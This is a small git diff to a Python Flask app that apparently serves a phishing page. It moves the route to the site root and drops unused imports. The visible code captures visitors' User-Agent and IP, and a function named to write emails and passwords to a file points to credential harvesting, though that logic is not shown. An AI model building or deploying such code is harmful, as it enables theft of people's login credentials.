@@ -1,13 +1,5 @@
 from flask import Flask , render_template,redirect
 from flask import request
-from flask import jsonify
-from flask import url_for
-
-#from OpenSSL import SSL
-#context = SSL.Context(SSL.PROTOCOL_TLSv1_2)
-#context.use_privatekey_file('server.key')
-#context.use_certificate_file('server.crt')
-
 
 app = Flask(__name__)
 
@@ -26,7 +18,7 @@ def Write_to_file(email,password,browser,user_ip):
 
 
 
-@app.route('/index', methods=["GET","POST"])
+@app.route('/', methods=["GET","POST"])
 def index():
 	user_browser = request.headers.get('User-Agent')
 	user_ip = request.remote_addr
